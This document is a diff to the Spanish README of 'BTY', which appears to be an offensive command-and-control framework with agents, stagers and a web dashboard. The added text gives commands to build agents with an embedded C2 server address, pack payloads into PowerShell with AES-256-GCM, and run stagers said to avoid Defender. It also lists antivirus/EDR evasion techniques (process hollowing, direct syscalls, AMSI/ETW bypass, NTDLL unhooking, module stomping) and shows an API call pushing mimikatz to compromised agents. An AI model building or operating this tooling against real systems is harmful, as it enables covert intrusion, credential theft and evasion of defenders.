@@ -4,10 +4,11 @@
 
 **ruby570bocadito © 2026 — MIT License**
 
-![Go](https://img.shields.io/badge/Go-1.23+-00ADD8?logo=go)
+![Go](https://img.shields.io/badge/Go-1.26+-00ADD8?logo=go)
 ![Python](https://img.shields.io/badge/Python-3.12+-3776AB?logo=python)
 ![License](https://img.shields.io/badge/License-MIT-green)
-![Tests](https://img.shields.io/badge/Tests-43%2F43%20PASS-brightgreen)
+![Tests](https://img.shields.io/badge/Tests-19%2F19%20PASS-brightgreen)
+![Security](https://img.shields.io/badge/Security-mTLS%20%7C%20AES--256--GCM%20%7C%20X25519-blue)
 
 ---
 
@@ -37,7 +38,7 @@ sudo apt install -y golang-go python3 curl git docker.io docker-compose
 # Clonar
 git clone https://github.com/ruby570bocadito/bty && cd BTY
 
-# Compilar (Go 1.23+)
+# Compilar (Go 1.26+)
 make build
 
 # O compilar para todas las plataformas
@@ -62,7 +63,7 @@ Auto-detecta IP → genera `config.yaml` → arranca 4 listeners:
 
 | Puerto | Protocolo | Uso |
 |--------|-----------|-----|
-| 8443 | TCP + TLS | Agentes |
+| 8443 | TCP + mTLS | Agentes (autenticación mutua) |
 | 8445 | HTTP | Long-polling |
 | 8446 | WebSocket | Tiempo real |
 | 9090 | HTTP | API REST + Dashboard |
@@ -76,7 +77,7 @@ Login:      admin / admin
 ### Inicio Manual
 
 ```bash
-# Con TLS automático
+# Con TLS automático y mTLS
 ./bty-server
 
 # Sin TLS (testing)
@@ -122,6 +123,12 @@ Los payloads precompilados están en `dist/`.
 BTY_SERVER=192.168.1.100:8443 ./bty-agent
 ```
 
+### Builder con server address embedido
+
+```bash
+cd src/go && go run cmd/builder/main.go go-linux --server 10.0.0.5:8443 --output ../../payloads/
+```
+
 ---
 
 ## 4. Evasión Antivirus
@@ -135,13 +142,16 @@ BTY_SERVER=192.168.1.100:8443 ./bty-agent
 | 1 | **Process Hollowing** | Payload corre dentro de svchost.exe (firmado Microsoft) |
 | 2 | **Syscalls Directos** | Bypass hooks ntdll.dll — EDR no ve las llamadas |
 | 3 | **Shellcode Stager C** | 2KB sin PE header, PEB API resolver, XOR decrypt |
-| 4 | **TLS + Domain Fronting** | Tráfico C2 parece HTTPS a `cdn.cloudflare.com` |
+| 4 | **mTLS + Domain Fronting** | Tráfico C2 autenticado y parece HTTPS legítimo |
 | 5 | **Sleep Obfuscation** | Heap/stack encriptado durante idle |
 | 6 | **Traffic Shaper** | Patrones imitan navegación humana |
 | 7 | **ObscuredString** | Strings sensibles XOR-encrypted en binario |
 | 8 | **Anti-sandbox** | 8 checks Windows + 6 checks Linux/macOS |
 | 9 | **Jitter** | Heartbeat 25-45s aleatorio, reconnect ±30% |
 | 10 | **AMSI/ETW Bypass** | Windows AMSI y ETW deshabilitados |
+| 11 | **NTDLL Unhooking** | Restaura syscall stubs originales desde disco |
+| 12 | **Module Stomping** | Overwrite DLL .text section con shellcode |
+| 13 | **Certificate Pinning** | Agente valida huella del servidor en primera conexión |
 
 ### Stagers evasivos
 
@@ -151,6 +161,9 @@ python3 scripts/stager.py
 
 # Ultra-stagers que no activan Defender (VBS, certutil, BITSAdmin)
 python3 scripts/ultra-stager.py
+
+# Payload packer con AES-256-GCM
+python3 scripts/packer.py -i bty-agent.exe -o packed.ps1 -f ps1
 ```
 
 ### Flujo evasivo completo
@@ -247,6 +260,18 @@ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/jso
 curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/modules
 curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
   -d '{"module":"mimikatz","agent_id":"ID"}' http://IP:9090/api/modules/push
+
+# mTLS Certificate Generation
+curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"agent_id":"agent-001"}' http://IP:9090/api/mtls/cert
+
+# SIEM Webhooks
+curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"url":"https://siem.corp.local/webhook","events":["session_established","task_result"]}' \
+  http://IP:9090/api/webhooks
+
+# Report Generation
+curl -H "Authorization: Bearer $TOKEN" "http://IP:9090/api/report?format=csv"
 ```
 
 | Método | Ruta | Descripción |
@@ -270,6 +295,12 @@ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/jso
 | GET | `/api/operators` | Listar operadores |
 | POST | `/api/operators` | Crear operador |
 | DELETE | `/api/operators/:id` | Eliminar operador |
+| POST | `/api/notes` | Session notes |
+| POST | `/api/lock` | Lock/unlock session |
+| GET/POST | `/api/profiles` | Agent profiles |
+| GET | `/api/report` | Generate engagement report |
+| POST | `/api/webhooks` | SIEM webhook config |
+| POST | `/api/mtls/cert` | Generate mTLS client cert |
 
 ### Módulos post-explotación
 
@@ -377,12 +408,18 @@ BTY/
 │   │   └── builder/main.go       ← Payload builder
 │   └── internal/
 │       ├── c2/
-│       │   ├── server.go         ← Main server + API handlers
+│       │   ├── server.go         ← Main server + accessors
+│       │   ├── context.go        ← Context-aware task execution
 │       │   ├── session/session.go← Session FSM + crypto
 │       │   ├── operations.go     ← SOCKS, Vault, Files, PortFwd
 │       │   ├── tunnel.go         ← Tunnel manager
 │       │   ├── ratelimit.go      ← Rate limiting middleware
 │       │   └── validation.go     ← Command validation
+│       ├── handlers/
+│       │   ├── router.go         ← Modular HTTP router + middleware
+│       │   ├── handlers.go       ← API endpoint handlers
+│       │   ├── validate.go       ← Request validation
+│       │   └── spa.go            ← Vue.js SPA serving
 │       ├── agent/
 │       │   ├── agent.go          ← Agent main loop + reconnect
 │       │   ├── modules.go        ← Built-in modules (7)
@@ -394,7 +431,8 @@ BTY/
 │       │   └── file_windows.go   ← Windows file operations
 │       ├── crypto/
 │       │   ├── keyx.go           ← X25519 + XChaCha20-Poly1305 + HKDF
-│       │   └── keyx_test.go      ← Tests + benchmarks
+│       │   ├── keyx_test.go      ← Tests + benchmarks
+│       │   └── mtls.go           ← mTLS CA/cert generation
 │       ├── evasion/
 │       │   ├── sleepmask.go      ← Sleep obfuscation (cross-platform)
 │       │   ├── sleepmask_unix.go ← mprotect implementation
@@ -412,12 +450,17 @@ BTY/
 │       │   ├── websocket.go      ← WebSocket transport (RFC 6455)
 │       │   └── dns.go            ← DNS tunneling
 │       ├── module/module.go      ← Dynamic modules
-│       ├── db/database.go        ← SQLite + bcrypt + migrations
+│       ├── db/
+│       │   ├── database.go       ← SQLite + bcrypt + migrations
+│       │   └── encrypt.go        ← AES-256-GCM at-rest encryption
 │       ├── config/config.go      ← YAML config loader
 │       ├── auth/jwt.go           ← JWT authentication
+│       ├── auth/rbac.go          ← Role-based access control
 │       ├── proto/                ← Protocol buffers
 │       ├── socks/                ← SOCKS5 RFC 1928
-│       └── logger/               ← Logging
+│       ├── logger/               ← Structured logging (JSON/text)
+│       ├── reporting/            ← Engagement report generator
+│       └── siem/                 ← SIEM event forwarding
 │
 ├── web/                          ← Vue 3 SPA dashboard
 │   ├── src/views/                ← Login, Sessions, Files, Dashboard
@@ -426,6 +469,7 @@ BTY/
 ├── scripts/
 │   ├── deploy.py                 ← Auto-deploy C2
 │   ├── payload.py                ← Payload generator (6 formats)
+│   ├── packer.py                 ← AES-256-GCM payload encryptor
 │   ├── console.py                ← CLI interactive console
 │   ├── stager.py                 ← XOR-encrypted stagers
 │   ├── ultra-stager.py           ← VBS, certutil, BITSAdmin stagers
@@ -467,6 +511,42 @@ BTY/
 ---
 
 ## 11. Changelog
+
+### v2.1.0 — Mayo 2026
+
+#### Seguridad
+- **mTLS (Mutual TLS):** Autenticación mutua servidor-agente con certificados ECDSA P-256
+- **Cifrado at-rest:** AES-256-GCM para credenciales, notas y secretos en SQLite
+- **Certificate Pinning:** Agente valida huella del servidor en primera conexión
+- **Structured Logging:** Logger JSON/text con multi-destination output
+
+#### Arquitectura
+- **Modular Handlers Package:** Separación de router, middleware y endpoint handlers
+- **Context.Context:** Cancelación y timeouts en ejecución de tareas y broadcast
+- **Server Accessors:** 16 métodos de acceso para integración modular
+- **Graceful Shutdown:** API server shutdown con context timeout de 30s
+
+#### Nuevas Funcionalidades
+- **SIEM Forwarding:** Eventos críticos forwarded a webhooks externos (Splunk, ELK)
+- **Reporting Engine:** Generador de informes de engagement en CSV/TXT
+- **Team Collaboration:** Session notes, locks, agent profiles
+- **Payload Builder:** Embed server address via ldflags antes de compilar
+
+#### Bugs Corregidos
+- Race condition en agent executeTask (variables compartidas sin sync)
+- Panic en SendEnvelope por type assertion insegura
+- Rate limiter con token bucket impreciso
+- Goroutine leak en PortFwdManager
+- Error handling faltante en websocket, camouflage
+- unsafe.Pointer deprecated en sleepmask (Go 1.20+)
+- Mutex copy en SOCKS stats
+- Validation bloqueaba comandos legítimos de pentesting
+- Bugs en scripts Python (console, payload)
+- Dockerfiles con versión de Go inexistente
+- evasion_other.go: AntiSandbox/AntiDebug redeclarados
+- packer.py: import base64 después de uso
+- evasion_windows.go: getProcAddress stub vacío
+- apiServer nunca se cerraba en Stop()
 
 ### v2.0.0 — Mayo 2026
 
